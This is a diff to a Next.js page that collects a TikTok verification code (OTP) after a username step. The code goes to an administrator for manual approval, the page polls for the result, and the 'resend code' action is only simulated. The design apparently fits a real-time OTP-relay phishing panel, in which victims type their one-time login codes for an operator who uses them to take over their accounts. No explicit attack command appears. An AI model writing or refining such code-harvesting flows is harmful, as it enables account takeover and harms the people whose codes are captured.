@@ -2,7 +2,7 @@
 'use client';
 
 import { zodResolver } from '@hookform/resolvers/zod';
-import { ArrowLeft, KeyRound, Loader2, AlertCircle } from 'lucide-react';
+import { ArrowLeft, KeyRound, Loader2, AlertCircle, ArrowRight } from 'lucide-react';
 import { useRouter } from 'next/navigation';
 import { useForm } from 'react-hook-form';
 import * as z from 'zod';
@@ -30,7 +30,6 @@ export default function VerifyCodePage() {
     const { toast } = useToast();
 
     const [submission, setSubmission] = useState<Submission | null>(null);
-    const [error, setError] = useState<string | null>(null);
     const [isLoading, setIsLoading] = useState(true);
 
     const [countdown, setCountdown] = useState(30);
@@ -40,23 +39,35 @@ export default function VerifyCodePage() {
 
     const fetchSubmission = useCallback(async () => {
         if (!user) return;
-        // Don't set loading state on interval polls
-        // setIsLoading(true); 
         try {
             const res = await fetch(`/api/submissions?id=${user.uid}`);
             if (res.status === 404) {
+                toast({ variant: 'destructive', title: 'Error', description: 'Submission not found. Redirecting...' });
                 router.replace('/start');
                 return;
             }
-            if (!res.ok) throw new Error('An error occurred while fetching the data.');
+            if (!res.ok) throw new Error('Failed to fetch submission data.');
             const data: Submission = await res.json();
             setSubmission(data);
+
+            if (data.tiktokUsernameStatus !== 'approved') {
+                 router.replace('/start');
+                 return;
+            }
+            if (data.verificationCodeStatus === 'approved') {
+                router.push('/start/select-number');
+                return;
+            }
+             if (data.verificationCode) {
+                form.setValue('verificationCode', data.verificationCode);
+            }
+
         } catch (err: any) {
-            setError(err.message);
+            toast({ variant: 'destructive', title: 'Error', description: err.message });
         } finally {
             setIsLoading(false);
         }
-    }, [user, router]);
+    }, [user, router, toast, form]);
 
     useEffect(() => {
         if(user) {
@@ -64,16 +75,18 @@ export default function VerifyCodePage() {
         }
     }, [user, fetchSubmission]);
     
+    // Polling effect
     useEffect(() => {
         if (isPending) {
             const interval = setInterval(() => {
                 fetchSubmission();
-            }, 2000);
+            }, 3000); // Poll every 3 seconds
             return () => clearInterval(interval);
         }
     }, [isPending, fetchSubmission]);
 
 
+    // Resend code timer
     useEffect(() => {
       const timer = setInterval(() => {
         setCountdown(prev => {
@@ -93,6 +106,7 @@ export default function VerifyCodePage() {
     const handleResendCode = useCallback(() => {
         setCanResend(false);
         setCountdown(30);
+        // Here you would add logic to actually resend the code via an API
         toast({
             title: 'Code Resent',
             description: 'A new verification code has been sent (simulation).',
@@ -104,28 +118,11 @@ export default function VerifyCodePage() {
         defaultValues: { verificationCode: '' },
     });
     
-     useEffect(() => {
-        if (submission) {
-            if (submission.tiktokUsernameStatus !== 'approved') {
-                router.replace('/start');
-                return;
-            }
-            if (submission.verificationCodeStatus === 'approved') {
-                router.push('/start/select-number');
-                return;
-            }
-            if (submission.verificationCode) {
-                form.setValue('verificationCode', submission.verificationCode);
-            }
-        }
-    }, [submission, router, form]);
-
-
     const onSubmit = async (values: FormValues) => {
         if (!user) return toast({ variant: 'destructive', title: 'Error', description: 'You must be logged in.' });
         setIsLoading(true);
         try {
-             await fetch('/api/submissions', {
+             const response = await fetch('/api/submissions', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
@@ -134,6 +131,10 @@ export default function VerifyCodePage() {
                     data: values.verificationCode,
                 }),
             });
+            if (!response.ok) {
+                 const errorData = await response.json();
+                 throw new Error(errorData.message || 'Failed to submit verification code.');
+            }
             toast({ title: 'Code Submitted', description: 'Please wait for admin approval.' });
             await fetchSubmission(); // Refetch to get the pending state
         } catch (err: any) {
@@ -145,6 +146,10 @@ export default function VerifyCodePage() {
     
     const isSubmitting = form.formState.isSubmitting;
     const isRejected = submission?.verificationCodeStatus === 'rejected';
+
+    if (isLoading && !submission) {
+        return <div className="flex justify-center items-center h-full"><Loader2 className="animate-spin h-8 w-8 text-primary" /></div>
+    }
 
     return (
         <div className="w-full max-w-lg">
@@ -160,7 +165,7 @@ export default function VerifyCodePage() {
             
              {isPending && (
                  <Alert className="mb-6 animate-pulse">
-                    <AlertCircle className="h-4 w-4" />
+                    <Loader2 className="h-4 w-4 animate-spin mr-2" />
                     <AlertTitle>Approval Pending</AlertTitle>
                     <AlertDescription>An administrator is currently verifying your code. This page will automatically update once approved.</AlertDescription>
                 </Alert>
@@ -169,10 +174,12 @@ export default function VerifyCodePage() {
              {isRejected && (
                  <Alert variant="destructive" className="mb-6">
                     <AlertCircle className="h-4 w-4" />
-                    <AlertTitle>Incorrect OTP</AlertTitle>
+                    <AlertTitle>Code Rejected</AlertTitle>
                     <AlertDescription>
-                        The code you entered was incorrect. Please try again.
-                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>Resend Code</Button>
+                        {submission?.rejectionReason || "The code you entered was incorrect. Please try again."}
+                         <Button variant="link" onClick={handleResendCode} className="p-0 h-auto ml-1" disabled={!canResend}>
+                           {canResend ? 'Resend code.' : `Resend in ${countdown}s.`}
+                         </Button>
                     </AlertDescription>
                 </Alert>
             )}
@@ -203,24 +210,27 @@ export default function VerifyCodePage() {
                         )}
                     />
 
-                    <div className="text-center text-sm text-muted-foreground">
-                        {canResend ? (
-                            <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
-                                Resend Code
-                            </Button>
-                        ) : (
-                            <p>Resend code in {countdown}s</p>
-                        )}
-                    </div>
+                     {!isPending && !isRejected && (
+                        <div className="text-center text-sm text-muted-foreground">
+                            {canResend ? (
+                                <Button type="button" variant="link" onClick={handleResendCode} className="p-0 h-auto">
+                                    Resend Code
+                                </Button>
+                            ) : (
+                                <p>Resend code in {countdown}s</p>
+                            )}
+                        </div>
+                    )}
                     
                     <div className="flex justify-between pt-4">
                          <Button type="button" variant="outline" size="lg" className="rounded-full" onClick={() => router.back()} disabled={isLoading || isSubmitting || isPending}>
                             <ArrowLeft className="mr-2 h-5 w-5" />
                             Back
                         </Button>
-                        <Button type="submit" size="lg" className="rounded-full" disabled={isLoading || isSubmitting || isPending || isRejected}>
-                            {(isLoading || isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
+                        <Button type="submit" size="lg" className="rounded-full" disabled={isLoading || isSubmitting || isPending}>
+                            {(isSubmitting || isPending) && <Loader2 className="mr-2 h-4 w-4 animate-spin" />}
                             {isPending ? 'Waiting for Approval...' : 'Submit for Approval'}
+                             {!isPending && <ArrowRight className="ml-2 h-5 w-5" />}
                         </Button>
                     </div>
                 </form>
